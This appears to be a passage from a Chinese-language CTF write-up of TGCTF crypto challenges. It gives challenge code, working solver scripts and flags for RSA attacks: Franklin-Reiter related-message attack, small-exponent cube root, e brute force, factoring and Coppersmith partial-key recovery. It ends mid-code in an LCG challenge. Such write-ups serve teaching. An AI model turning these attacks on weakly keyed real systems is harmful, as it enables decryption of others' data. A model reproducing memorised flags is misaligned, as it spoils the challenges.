<h3 id="RwSiAns"><a href="#RwSiAns" class="headerlink" title="RwSiAns"></a>RwSiAns</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flag <span class="token keyword">import</span> FLAG
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long
<span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span>bits<span class="token operator">=</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    <span class="token keyword">return</span> p <span class="token operator">*</span> q<span class="token punctuation">,</span> <span class="token number">3</span>

<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">7</span>
    c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> c1<span class="token punctuation">,</span> c2

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>
n<span class="token punctuation">,</span> e <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
c1<span class="token punctuation">,</span> c2 <span class="token operator">=</span> encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c1 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c1<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c2 = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c2<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

n <span class="token operator">=</span> <span class="token number">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>
e <span class="token operator">=</span> <span class="token number">3</span>
c1 <span class="token operator">=</span> <span class="token number">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>
c2 <span class="token operator">=</span> <span class="token number">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span></code></pre>

<p>基础的相关信息攻击</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> hashlib

<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span>bits<span class="token operator">=</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>
    <span class="token keyword">return</span> p <span class="token operator">*</span> q<span class="token punctuation">,</span> <span class="token number">3</span>

<span class="token keyword">def</span> <span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">:</span>
    x1<span class="token punctuation">,</span> x2 <span class="token operator">=</span> <span class="token number">307</span><span class="token punctuation">,</span> <span class="token number">7</span>
    c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token builtin">hash</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
    <span class="token keyword">return</span> c1<span class="token punctuation">,</span> c2


n <span class="token operator">=</span> <span class="token number">100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839</span>
e <span class="token operator">=</span> <span class="token number">3</span>
c1 <span class="token operator">=</span> <span class="token number">41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366</span>
c2 <span class="token operator">=</span> <span class="token number">41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814</span>
s1<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token number">307</span><span class="token punctuation">)</span>
s2<span class="token operator">=</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">franklinReiter</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    g1 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c1
    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>s2<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2

    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>
            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2
        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

m<span class="token operator">=</span>franklinReiter<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}</p>
</blockquote>
<h3 id="宝宝rsa"><a href="#宝宝rsa" class="headerlink" title="宝宝rsa"></a>宝宝rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> gcd
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

<span class="token comment"># PART1</span>
p1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
q1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
n1 <span class="token operator">=</span> p1 <span class="token operator">*</span> q1
phi <span class="token operator">=</span> <span class="token punctuation">(</span>p1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
m1 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
e1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> gcd<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> phi<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
    e1 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>
c1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e1<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p1 ="</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q1 ="</span><span class="token punctuation">,</span> q1<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c1 ="</span><span class="token punctuation">,</span> c1<span class="token punctuation">)</span>

<span class="token comment"># PART2</span>
n2 <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span> <span class="token operator">*</span> getPrime<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span>
e2 <span class="token operator">=</span> <span class="token number">3</span>
m2 <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
c2 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e2<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n2 ="</span><span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c2 ="</span><span class="token punctuation">,</span> c2<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"e2 ="</span><span class="token punctuation">,</span> e2<span class="token punctuation">)</span></code></pre>

<p>flag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e&#x3D;3，n为1024位，m应该比较小直接开方即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm

phi1<span class="token operator">=</span><span class="token punctuation">(</span>p1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q1<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>i<span class="token punctuation">,</span> phi1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>i<span class="token punctuation">,</span>phi1<span class="token punctuation">)</span>
    m1<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p1<span class="token operator">*</span>q1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">b'TGCTF'</span> <span class="token keyword">in</span> m1<span class="token punctuation">:</span>
        <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span>

<span class="token comment"># ---------------------------------------------------</span>
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>

m2<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>c2<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>m1<span class="token operator">+</span>m2<span class="token punctuation">)</span></code></pre>

<blockquote>
<p>TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}</p>
</blockquote>
<h3 id="费克特尔"><a href="#费克特尔" class="headerlink" title="费克特尔"></a>费克特尔</h3><pre class="language-Plain" data-language="Plain"><code class="language-Plain">c&#x3D;670610235999012099846283721569059674725712804950807955010725968103642359765806
n&#x3D;810544624661213367964996895060815354972889892659483948276203088055391907479553
e&#x3D;65537</code></pre>

<p>n很小直接yafu分一下,有很多因子,正常解即可</p>
<pre class="language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *

c&#x3D;670610235999012099846283721569059674725712804950807955010725968103642359765806
n&#x3D;810544624661213367964996895060815354972889892659483948276203088055391907479553
e&#x3D;65537

p&#x3D; [916848439436544911290378588839845528581,214168842768662180574654641, 2001511,18251 ,113 ]
phi&#x3D;1
for i in p:
    phi*&#x3D;(i-1)

d&#x3D;inverse(e,phi)

print(long_to_bytes(pow(c,d,n)))</code></pre>

<blockquote>
<p>TGCTF{f4888_6abdc_9c2bd_9036bb}</p>
</blockquote>
<h3 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h3><pre class="language-Python" data-language="Python"><code class="language-Python">from Crypto.Util.number import *

def genarate_emojiiiiii_prime(nbits, base&#x3D;0):
    while True:
        p &#x3D; getPrime(base &#x2F;&#x2F; 32 * 32) if base &gt;&#x3D; 3 else 0
        for i in range(nbits &#x2F;&#x2F; 8 &#x2F;&#x2F; 4 - base &#x2F;&#x2F; 32):
            p &#x3D; (p &lt;&lt; 32) + get_random_emojiiiiii() # 猜一猜
        if isPrime(p):
            return p

m &#x3D; bytes_to_long(flag.encode()+ &quot;&quot;.join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())
p &#x3D; genarate_emojiiiiii_prime(512, 224)
q &#x3D; genarate_emojiiiiii_prime(512)

n &#x3D; p * q
e &#x3D; &quot;💯&quot;
c &#x3D; pow(m, bytes_to_long(e.encode()), n)

print(&quot;p0 &#x3D;&quot;, long_to_bytes(p % 2 ** 256).decode())
print(&quot;n &#x3D;&quot;, n)
print(&quot;c &#x3D;&quot;, c)

p0 &#x3D; &#39;😘😾😂😋😶😾😳😷&#39;
n &#x3D; 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c &#x3D; 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</code></pre>

<p>根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位</p>
<p>题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可</p>
<p>知道低32*9&#x3D;288位即可copper得到p</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

p0_ <span class="token operator">=</span> <span class="token number">108837065531980906150333850570890620719343963272506332719822248235755953428663</span>
n <span class="token operator">=</span> <span class="token number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span>
c <span class="token operator">=</span> <span class="token number">47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span>

a<span class="token operator">=</span><span class="token number">4036991100</span>

<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> tqdm
<span class="token keyword">for</span> i <span class="token keyword">in</span> tqdm<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> x <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">288</span> <span class="token operator">+</span> p0_ <span class="token operator">+</span> <span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">256</span>
    f <span class="token operator">=</span> f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
    roots <span class="token operator">=</span> f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">225</span><span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">,</span>epsilon<span class="token operator">=</span><span class="token number">0.04</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> roots<span class="token punctuation">:</span>
        x <span class="token operator">=</span> roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        p_candidate <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x <span class="token operator">*</span> <span class="token number">2</span><span class="token operator">^</span><span class="token number">288</span> <span class="token operator">+</span> p0_ <span class="token operator">+</span> <span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">256</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> n <span class="token operator">%</span> p_candidate <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Found p:"</span><span class="token punctuation">,</span> p_candidate<span class="token punctuation">)</span>
            q_candidate <span class="token operator">=</span> n <span class="token operator">//</span> p_candidate
            <span class="token keyword">break</span>

<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>

p<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p_candidate<span class="token punctuation">)</span>
q<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>q_candidate<span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">4036989615</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span>q<span class="token punctuation">,</span>n<span class="token operator">%</span>p<span class="token punctuation">,</span>n<span class="token operator">%</span>q<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

d<span class="token operator">=</span>inverse<span class="token punctuation">(</span>e<span class="token operator">//</span>GCD<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>

R<span class="token punctuation">.</span><span class="token operator">&lt;</span>y<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
f<span class="token operator">=</span>y<span class="token operator">^</span><span class="token number">15</span><span class="token operator">-</span>c
f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
m1<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>

R<span class="token punctuation">.</span><span class="token operator">&lt;</span>z<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
f<span class="token operator">=</span>z<span class="token operator">^</span><span class="token number">15</span><span class="token operator">-</span>c
f<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>
m2<span class="token operator">=</span>f<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> m1<span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> m2<span class="token punctuation">:</span>
        m<span class="token operator">=</span>solve_crt<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'TGCTF'</span> <span class="token keyword">in</span> long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了</p>
<blockquote>
<p>TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢</p>
</blockquote>
<h3 id="LLLCG"><a href="#LLLCG" class="headerlink" title="LLLCG"></a><strong><strong>LLLCG</strong></strong></h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> randint
<span class="token keyword">import</span> socketserver
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token punctuation">,</span> dsa_p<span class="token punctuation">,</span> dsa_q

<span class="token keyword">class</span> <span class="token class-name">TripleLCG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">[</span>seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> a
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> b
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> c
        self<span class="token punctuation">.</span>d <span class="token operator">=</span> d
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> n

